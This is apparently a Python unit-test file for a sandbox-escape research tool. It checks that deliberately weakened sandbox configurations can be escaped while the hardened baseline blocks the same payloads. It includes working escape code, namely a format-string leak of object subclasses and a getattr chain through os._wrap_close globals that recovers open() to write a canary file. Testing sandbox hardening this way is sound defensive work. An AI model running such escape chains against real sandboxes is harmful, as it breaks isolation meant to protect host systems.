"""Unit tests for the realistic-misconfiguration sandbox_exec variants.

Each test pairs a weakened variant with the hardened baseline (`sandbox_exec`)
on the *same* payload, to show the escape depends on the one changed line in
the misconfigured worker script, not on anything else.
"""

from __future__ import annotations

from sandbox_escape_finder.dynamic_prober import sandbox_exec
from sandbox_escape_finder.misconfigured_sandboxes import (
    sandbox_exec_exposed_getattr_builtin,
    sandbox_exec_weak_getattr_hook,
)
from sandbox_escape_finder.oracle import EscapeOracle, capture_canary_state, oracle
from sandbox_escape_finder.payloads import PAYLOADS


class TestWeakGetattrHook:
    """Variant 1: _getattr_ wired to plain getattr instead of safer_getattr."""

    LEAK_CODE = "print('{0.__class__.__bases__[0].__subclasses__}'.format(''))"

    def test_hardened_baseline_blocks_format_string_leak(self) -> None:
        """Sanity check: the hardened sandbox_exec blocks this under safer_getattr."""
        result = sandbox_exec(self.LEAK_CODE)
        assert result["executed"] is False
        assert "NotImplementedError" in (result["exception"] or "")

    def test_weak_hook_leaks_subclasses_repr(self) -> None:
        """With safer_getattr's format guard gone, the template evaluates and
        the leaked repr of object.__subclasses__ reaches stdout."""
        result = sandbox_exec_weak_getattr_hook(self.LEAK_CODE)
        assert result["executed"] is True
        assert result["exception"] is None
        assert "__subclasses__" in result["stdout"]

    def test_weak_hook_cannot_call_the_leaked_method(self) -> None:
        """str.format() always returns a str, never the live object, so the
        leaked value cannot be called to pivot further -- this variant is an
        information-disclosure primitive only, not a capability-recovery one."""
        code = (
            "gadget = '{0.__class__.__bases__[0].__subclasses__}'.format('')\n"
            "gadget()"
        )
        result = sandbox_exec_weak_getattr_hook(code)
        assert result["executed"] is False
        assert "not callable" in (result["exception"] or "")

    def test_weak_hook_does_not_reopen_literal_dunder_attribute_syntax(self) -> None:
        """Compile-time underscore rejection is independent of _getattr_: it
        still applies even when the runtime hook is weakened."""
        result = sandbox_exec_weak_getattr_hook("x = ().__class__")
        assert result["executed"] is False
        assert "SyntaxError" in (result["exception"] or "")
        assert "__class__" in (result["exception"] or "")

    def test_main_corpus_still_produces_zero_canary_escapes(self) -> None:
        """The corpus's canary-write payload still needs literal __builtins__
        syntax, which this variant does not reopen."""
        for payload in PAYLOADS:
            with EscapeOracle() as oracle_inst:
                canary_path = oracle_inst.canary_path
                assert canary_path is not None
                code = payload["code"].replace("{canary_path}", str(canary_path).replace("\\", "/"))
                pre = capture_canary_state(canary_path)
                result = sandbox_exec_weak_getattr_hook(code, timeout=2.0, work_dir=canary_path.parent)
                post = capture_canary_state(canary_path)
                assert oracle(pre, result, post) is False, f"{payload['id']} unexpectedly escaped"


class TestExposedGetattrBuiltin:
    """Variant 2: the plain getattr builtin restored to the sandbox globals."""

    ADAPTIVE_PAYLOAD = next(p for p in PAYLOADS if p["id"] == "adaptive_getattr_string_concat")

    def test_hardened_baseline_blocks_dynamic_getattr_call(self) -> None:
        """Sanity check: the hardened sandbox_exec has no getattr in globals."""
        result = sandbox_exec(self.ADAPTIVE_PAYLOAD["code"])
        assert result["executed"] is False
        assert "NameError" in (result["exception"] or "")

    def test_exposed_getattr_recovers_full_subclasses_graph(self) -> None:
        """With getattr restored, the same corpus payload (a genuine static-
        analyzer blind spot: the dunder name is assembled from string
        concatenation, so no detector matches it) actually runs and recovers
        a dangerous capability -- a real false negative."""
        result = sandbox_exec_exposed_getattr_builtin(self.ADAPTIVE_PAYLOAD["code"])
        assert result["executed"] is True
        assert result["exception"] is None
        assert result["capability_recovered"] is True

    def test_exposed_getattr_achieves_full_canary_write(self) -> None:
        """getattr() returns live objects (unlike the format-string leak), so
        this variant can pivot through object.__subclasses__() to
        os._wrap_close and recover a real, callable open() -- a complete,
        oracle-confirmed escape, not just a capability-recovery heuristic."""
        code = (
            "object_type = getattr(int, '__base__')\n"
            "classes = getattr(object_type, '__subclasses__')()\n"
            "wrap_close = [c for c in classes if 'wrap_close' in str(c)][0]\n"
            "init_fn = getattr(wrap_close, '__init__')\n"
            "g = getattr(init_fn, '__globals__')\n"
            "b = g['__builtins__']\n"
            "b['open']('{canary_path}', 'w').write('PWNED_VIA_EXPOSED_GETATTR')\n"
        )
        with EscapeOracle() as oracle_inst:
            canary_path = oracle_inst.canary_path
            assert canary_path is not None
            formatted = code.replace("{canary_path}", str(canary_path).replace("\\", "/"))
            pre = capture_canary_state(canary_path)
            result = sandbox_exec_exposed_getattr_builtin(formatted, timeout=3.0, work_dir=canary_path.parent)
            post = capture_canary_state(canary_path)

            assert result["executed"] is True
            assert oracle(pre, result, post) is True
            assert canary_path.read_text(encoding="utf-8") == "PWNED_VIA_EXPOSED_GETATTR"

    def test_does_not_reopen_literal_dunder_attribute_syntax(self) -> None:
        """Compile-time underscore rejection is unaffected: exposing the
        getattr *builtin* does not touch the AST transform at all."""
        result = sandbox_exec_exposed_getattr_builtin("x = ().__class__")
        assert result["executed"] is False
        assert "SyntaxError" in (result["exception"] or "")
